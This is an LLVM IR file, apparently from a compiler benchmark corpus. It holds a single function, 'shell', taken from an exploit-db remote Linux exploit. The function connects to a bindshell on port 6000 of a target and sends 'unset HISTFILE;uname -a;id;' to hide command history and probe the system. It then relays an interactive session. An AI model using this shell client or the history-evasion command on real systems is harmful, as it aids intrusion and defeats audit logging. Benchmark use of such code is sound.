; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_826.c_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_826.c_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, i32 }
%struct.hostent = type { i32, i64 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [29 x i8] c"unset HISTFILE;uname -a;id;\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [19 x i8] c"can't open socket\0A\00", align 1
@.str.2 = private unnamed_addr constant [33 x i8] c"[-] Connect to bindshell failed\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [5 x i8] c"EOF\0A\00", align 1
@.str.4 = private unnamed_addr constant [18 x i8] c"Connection lost.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @shell(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %2, align 8
  store i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0), i8** %5, align 8
  store i32 6000, i32* %7, align 4
  %11 = load i8*, i8** %2, align 8
  %12 = call %struct.hostent* @gethostbyname(i8* %11)
  store %struct.hostent* %12, %struct.hostent** %10, align 8
  %13 = load i32, i32* @AF_INET, align 4
  %14 = load i32, i32* @SOCK_STREAM, align 4
  %15 = load i32, i32* @IPPROTO_TCP, align 4
  %16 = call i32 @socket(i32 %13, i32 %14, i32 %15)
  store i32 %16, i32* %8, align 4
  %17 = icmp slt i32 %16, 0
  br i1 %17, label %18, label %21

18:                                               ; preds = %1
  %19 = call i32 @perror(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0))
  %20 = call i32 @exit(i32 1) #3
  unreachable

21:                                               ; preds = %1
  %22 = bitcast %struct.sockaddr_in* %9 to i8*
  %23 = call i32 @bzero(i8* %22, i32 12)
  %24 = load i32, i32* @AF_INET, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  store i32 %24, i32* %25, align 4
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 1
  %28 = load i64, i64* %27, align 8
  %29 = inttoptr i64 %28 to i8*
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  %31 = bitcast i32* %30 to i8*
  %32 = load %struct.hostent*, %struct.hostent** %10, align 8
  %33 = getelementptr inbounds %struct.hostent, %struct.hostent* %32, i32 0, i32 0
  %34 = load i32, i32* %33, align 8
  %35 = call i32 @bcopy(i8* %29, i8* %31, i32 %34)
  %36 = load i32, i32* %7, align 4
  %37 = call i32 @htons(i32 %36)
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i32 %37, i32* %38, align 4
  %39 = load i32, i32* %8, align 4
  %40 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %41 = call i64 @connect(i32 %39, %struct.sockaddr* %40, i32 12)
  %42 = icmp slt i64 %41, 0
  br i1 %42, label %43, label %45

43:                                               ; preds = %21
  %44 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.2, i64 0, i64 0))
  ret i32 -1

45:                                               ; preds = %21
  %46 = call i32 @FD_ZERO(i32* %3)
  %47 = load i32, i32* %8, align 4
  %48 = call i32 @FD_SET(i32 %47, i32* %3)
  %49 = call i32 @FD_SET(i32 0, i32* %3)
  %50 = load i32, i32* %8, align 4
  %51 = load i8*, i8** %5, align 8
  %52 = load i8*, i8** %5, align 8
  %53 = call i32 @strlen(i8* %52)
  %54 = call i64 @send(i32 %50, i8* %51, i32 %53, i32 0)
  br label %55

55:                                               ; preds = %45, %103
  %56 = load i32, i32* %8, align 4
  %57 = call i32 @FD_SET(i32 %56, i32* %3)
  %58 = call i32 @FD_SET(i32 0, i32* %3)
  %59 = load i32, i32* %8, align 4
  %60 = add nsw i32 %59, 1
  %61 = call i64 @select(i32 %60, i32* %3, i32* null, i32* null, i32* null)
  %62 = icmp slt i64 %61, 0
  br i1 %62, label %63, label %64

63:                                               ; preds = %55
  br label %105

64:                                               ; preds = %55
  %65 = load i32, i32* %8, align 4
  %66 = call i64 @FD_ISSET(i32 %65, i32* %3)
  %67 = icmp ne i64 %66, 0
  br i1 %67, label %68, label %84

68:                                               ; preds = %64
  %69 = load i32, i32* %8, align 4
  %70 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %71 = call i32 @recv(i32 %69, i8* %70, i32 2048, i32 0)
  store i32 %71, i32* %6, align 4
  %72 = icmp slt i32 %71, 0
  br i1 %72, label %73, label %77

73:                                               ; preds = %68
  %74 = load i32, i32* @stderr, align 4
  %75 = call i32 @fprintf(i32 %74, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  %76 = call i32 @exit(i32 2) #3
  unreachable

77:                                               ; preds = %68
  %78 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %79 = load i32, i32* %6, align 4
  %80 = call i64 @write(i32 1, i8* %78, i32 %79)
  %81 = icmp slt i64 %80, 0
  br i1 %81, label %82, label %83

82:                                               ; preds = %77
  br label %105

83:                                               ; preds = %77
  br label %84

84:                                               ; preds = %83, %64
  %85 = call i64 @FD_ISSET(i32 0, i32* %3)
  %86 = icmp ne i64 %85, 0
  br i1 %86, label %87, label %103

87:                                               ; preds = %84
  %88 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %89 = call i32 @read(i32 0, i8* %88, i32 2048)
  store i32 %89, i32* %6, align 4
  %90 = icmp slt i32 %89, 0
  br i1 %90, label %91, label %95

91:                                               ; preds = %87
  %92 = load i32, i32* @stderr, align 4
  %93 = call i32 @fprintf(i32 %92, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  %94 = call i32 @exit(i32 2) #3
  unreachable

95:                                               ; preds = %87
  %96 = load i32, i32* %8, align 4
  %97 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %98 = load i32, i32* %6, align 4
  %99 = call i64 @send(i32 %96, i8* %97, i32 %98, i32 0)
  %100 = icmp slt i64 %99, 0
  br i1 %100, label %101, label %102

101:                                              ; preds = %95
  br label %105

102:                                              ; preds = %95
  br label %103

103:                                              ; preds = %102, %84
  %104 = call i32 @usleep(i32 10)
  br label %55

105:                                              ; preds = %101, %82, %63
  %106 = load i32, i32* @stderr, align 4
  %107 = call i32 @fprintf(i32 %106, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.4, i64 0, i64 0))
  %108 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @bcopy(i8*, i8*, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i64 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i64 @write(i32, i8*, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @usleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
